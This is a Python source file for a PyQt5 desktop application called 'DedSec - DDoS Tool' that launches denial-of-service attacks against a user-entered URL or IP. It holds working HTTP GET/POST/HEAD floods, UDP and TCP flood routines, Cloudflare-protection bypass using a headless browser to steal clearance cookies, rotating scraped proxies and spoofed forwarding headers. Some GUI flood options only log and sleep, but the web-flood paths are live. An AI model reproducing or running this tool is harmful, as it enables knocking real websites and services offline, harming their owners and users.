import sys
import os
import threading
import requests
import time
import cloudscraper
import datetime
import random
import socks
import socket
import ssl
from urllib.parse import urlparse
from requests.cookies import RequestsCookieJar
import undetected_chromedriver as webdriver
from PyQt5.QtWidgets import QApplication, QWidget, QPushButton, QLabel, QLineEdit, QVBoxLayout, QHBoxLayout, QCheckBox, QTextEdit, QGridLayout, QMessageBox
from PyQt5.QtCore import Qt, QTimer
from PyQt5.QtGui import QIcon


def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while True:
        if (until - datetime.datetime.now()).total_seconds() > 0:
            print(f"Attack status => {str((until - datetime.datetime.now()).total_seconds())} sec left ")
        else:
            print("Attack Done!")
            return


def get_target(url):
    url = url.rstrip()
    target = {}
    target['uri'] = urlparse(url).path
    if target['uri'] == "":
        target['uri'] = "/"
    target['host'] = urlparse(url).netloc
    target['scheme'] = urlparse(url).scheme
    if ":" in urlparse(url).netloc:
        target['port'] = urlparse(url).netloc.split(":")[1]
    else:
        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
    return target


def get_proxylist(type):
    if type == "SOCKS5":
        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all").text
        r += requests.get("https://www.proxy-list.download/api/v1/get?type=socks5").text
        open("./resources/socks5.txt", 'w').write(r)
        r = r.rstrip().split('\r\n')
        return r
    elif type == "HTTP":
        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000&country=all").text
        r += requests.get("https://www.proxy-list.download/api/v1/get?type=http").text
        open("./resources/http.txt", 'w').write(r)
        r = r.rstrip().split('\r\n')
        return r


def get_proxies():
    global proxies
    if not os.path.exists("./proxy.txt"):
        print("You Need Proxy File ( ./proxy.txt )")
        return False
    proxies = open("./proxy.txt", 'r').read().split('\n')
    return True


def get_cookie(url):
    global useragent, cookieJAR, cookie
    options = webdriver.ChromeOptions()
    arguments = [
        '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars', '--disable-logging', '--disable-login-animations',
        '--disable-notifications', '--disable-gpu', '--headless', '--lang=ko_KR', '--start-maximized',
        '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en'
    ]
    for argument in arguments:
        options.add_argument(argument)
    driver = webdriver.Chrome(options=options)
    driver.implicitly_wait(3)
    driver.get(url)
    for _ in range(60):
        cookies = driver.get_cookies()
        tryy = 0
        for i in cookies:
            if i['name'] == 'cf_clearance':
                cookieJAR = driver.get_cookies()[tryy]
                useragent = driver.execute_script("return navigator.userAgent")
                cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
                driver.quit()
                return True
            else:
                tryy += 1
        time.sleep(1)
    driver.quit()
    return False


def spoof(target):
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    spoofip = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return (
        "X-Forwarded-Proto: Http\r\n"
        f"X-Forwarded-Host: {target['host']}, 1.1.1.1\r\n"
        f"Via: {spoofip}\r\n"
        f"Client-IP: {spoofip}\r\n"
        f'X-Forwarded-For: {spoofip}\r\n'
        f'Real-IP: {spoofip}\r\n'
    )


# Funções de ataque Layer 4 (UDP/TCP Flood)
def runflooder(host, port, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    rand = random._urandom(4096)
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=flooder, args=(host, port, rand, until))
            thd.start()
        except:
            pass


def flooder(host, port, rand, until_datetime):
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto(rand, (host, int(port)))
        except:
            sock.close()
            pass


def runsender(host, port, th, t, payload):
    if payload == "":
        payload = random._urandom(60000)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=sender, args=(host, port, until, payload))
            thd.start()
        except:
            pass


def sender(host, port, until_datetime, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto(payload, (host, int(port)))
        except:
            sock.close()
            pass


def LaunchCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFB, args=(url, until, scraper))
            thd.start()
        except:
            pass


def AttackCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url, timeout=15)
            scraper.get(url, timeout=15)
        except:
            pass


def LaunchPXCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPXCFB, args=(url, until, scraper))
            thd.start()
        except:
            pass


def AttackPXCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            proxy = {
                    'http': 'http://' + str(random.choice(list(proxies))),
                    'https': 'http://' + str(random.choice(list(proxies))),
            }
            scraper.get(url, proxies=proxy)
            scraper.get(url, proxies=proxy)
        except:
            pass


def LaunchCFPRO(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    session = requests.Session()
    scraper = cloudscraper.create_scraper(sess=session)
    jar = RequestsCookieJar()
    jar.set(cookieJAR['name'], cookieJAR['value'])
    scraper.cookies = jar
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFPRO, args=(url, until, scraper))
            thd.start()
        except:
            pass


def AttackCFPRO(url, until_datetime, scraper):
    headers = {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'TE': 'trailers',
    }
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url=url, headers=headers, allow_redirects=False)
            scraper.get(url=url, headers=headers, allow_redirects=False)
        except:
            pass


def AttackCFSOC(until_datetime, target, req):
    scraper = cloudscraper.create_scraper()
    if target['scheme'] == 'https':
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
        packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
    else:
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            for _ in range(10):
                packet.send(str.encode(req))
        except:
            packet.close()
            pass


class DDOSApp(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        self.setWindowTitle('DedSec - DDoS Tool')
        self.setGeometry(100, 100, 800, 600)

        layout = QVBoxLayout()

        title = QLabel(' ⥪ 𝐃𝐞𝐝𝐒𝐞𝐜 - 𝐃𝐃𝐨𝐒 𝐓𝐨𝐨𝐥 ⥬ ', self)
        title.setAlignment(Qt.AlignCenter)
        title.setStyleSheet("font-size: 24px; font-weight: bold;")
        layout.addWidget(title)
        
        self.setWindowIcon(QIcon('./logoDedSec.jpeg'))  # Exemplo com um arquivo .ico

        self.setGeometry(100, 100, 800, 600)  # Tamanho e posição da janela
        self.show()

        target_layout = QGridLayout()
        target_layout.addWidget(QLabel('URL/IP Target:'), 0, 0)
        self.target_input = QLineEdit(self)
        target_layout.addWidget(self.target_input, 0, 1)

        target_layout.addWidget(QLabel('Port (Optional):'), 1, 0)
        self.port_input = QLineEdit(self)
        target_layout.addWidget(self.port_input, 1, 1)

        layout.addLayout(target_layout)


        layer_titles_layout = QHBoxLayout()
        layer_titles_layout.addWidget(QLabel("Layer 7 Attacks:"))
        layer_titles_layout.addWidget(QLabel("Layer 4 Attacks:"))
        layout.addLayout(layer_titles_layout)

        checkboxes_layout = QHBoxLayout()

        layer7_layout = QHBoxLayout()
        self.get_checkbox = QCheckBox("HTTP GET", self)
        self.post_checkbox = QCheckBox("HTTP POST", self)
        self.head_checkbox = QCheckBox("HTTP HEAD", self)
        self.cfb_checkbox = QCheckBox("Cloudflare Bypass", self)
        layer7_layout.addWidget(self.get_checkbox)
        layer7_layout.addWidget(self.post_checkbox)
        layer7_layout.addWidget(self.head_checkbox)
        layer7_layout.addWidget(self.cfb_checkbox)
        checkboxes_layout.addLayout(layer7_layout)

        layer4_layout = QHBoxLayout()
        self.udp_checkbox = QCheckBox("UDP Flood", self)
        self.tcp_checkbox = QCheckBox("TCP Flood", self)
        layer4_layout.addWidget(self.udp_checkbox)
        layer4_layout.addWidget(self.tcp_checkbox)
        checkboxes_layout.addLayout(layer4_layout)

        layout.addLayout(checkboxes_layout)

        attack_layout = QGridLayout()
        attack_layout.addWidget(QLabel('Threads:'), 0, 0)
        self.threads_input = QLineEdit(self)
        attack_layout.addWidget(self.threads_input, 0, 1)

        attack_layout.addWidget(QLabel('Duration (Seconds):'), 1, 0)
        self.duration_input = QLineEdit(self)
        attack_layout.addWidget(self.duration_input, 1, 1)

        layout.addLayout(attack_layout)

        control_layout = QHBoxLayout()
        self.start_button = QPushButton('Start Attack', self)
        self.start_button.clicked.connect(self.start_attack)
        control_layout.addWidget(self.start_button)

        self.stop_button = QPushButton('Stop Attack', self)
        self.stop_button.clicked.connect(self.stop_attack)
        self.stop_button.setEnabled(False)
        control_layout.addWidget(self.stop_button)

        layout.addLayout(control_layout)

        self.log_output = QTextEdit(self)
        self.log_output.setReadOnly(True)
        layout.addWidget(self.log_output)

        self.setLayout(layout)

    def start_attack(self):
        target = self.target_input.text().strip()
        if not target:
            self.show_error('Please enter a valid target (URL or IP).')
            return

        threads = self.threads_input.text().strip()
        if not threads.isdigit() or int(threads) <= 0:
            self.show_error('Please enter a valid number of threads.')
            return

        duration = self.duration_input.text().strip()
        if not duration.isdigit() or int(duration) <= 0:
            self.show_error('Please enter a valid duration in seconds.')
            return

        if not (self.get_checkbox.isChecked() or self.post_checkbox.isChecked() or self.head_checkbox.isChecked() or
                self.udp_checkbox.isChecked() or self.tcp_checkbox.isChecked() or self.cfb_checkbox.isChecked()):
            self.show_error('Please select at least one attack method.')
            return

        self.log_output.append(f'Starting attack on {target} with {threads} threads for {duration} seconds.\n')
        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(True)

        self.attack_thread = threading.Thread(target=self.run_attack, args=(target, int(threads), int(duration)))
        self.attack_thread.start()

        self.timer = QTimer()
        self.timer.timeout.connect(self.update_log)
        self.timer.start(100)

    def run_attack(self, target, threads, duration):
        until = datetime.datetime.now() + datetime.timedelta(seconds=duration)
        while (until - datetime.datetime.now()).total_seconds() > 0:
            if self.get_checkbox.isChecked():
                self.send_request("GET", target)

            if self.post_checkbox.isChecked():
                self.send_request("POST", target)

            if self.head_checkbox.isChecked():
                self.send_request("HEAD", target)

            if self.cfb_checkbox.isChecked():
                self.log_output.append(f"[Cloudflare Bypass] Attacking {target}...\n")
                LaunchCFB(target, threads, duration)

            if self.udp_checkbox.isChecked():
                self.log_output.append(f"[UDP Flood] Flooding {target}...\n")
                time.sleep(0.5)  # Simulando ataque UDP

            if self.tcp_checkbox.isChecked():
                self.log_output.append(f"[TCP Flood] Flooding {target}...\n")
                time.sleep(0.5)  # Simulando ataque TCP

        self.log_output.append("Attack finished.\n")
        self.start_button.setEnabled(True)
        self.stop_button.setEnabled(False)

    def send_request(self, method, target):
        try:
            scraper = cloudscraper.create_scraper()
            response = scraper.request(method, target, timeout=5)
            status_code = response.status_code
            self.log_output.append(f"[{method}] Request to {target} - Status: {status_code}\n")
        except Exception as e:
            self.log_output.append(f"[{method}] Request to {target} - Error: {str(e)}\n")
        #time.sleep(0.5)

    def stop_attack(self):
        self.log_output.append('Stopping attack...\n')
        self.start_button.setEnabled(True)
        self.stop_button.setEnabled(False)
        self.timer.stop()

    def update_log(self):
        self.log_output.ensureCursorVisible()

    def show_error(self, message):
        QMessageBox.critical(self, 'Error', message)


if __name__ == '__main__':
    app = QApplication(sys.argv)
    ex = DDOSApp()
    ex.show()
    sys.exit(app.exec_())
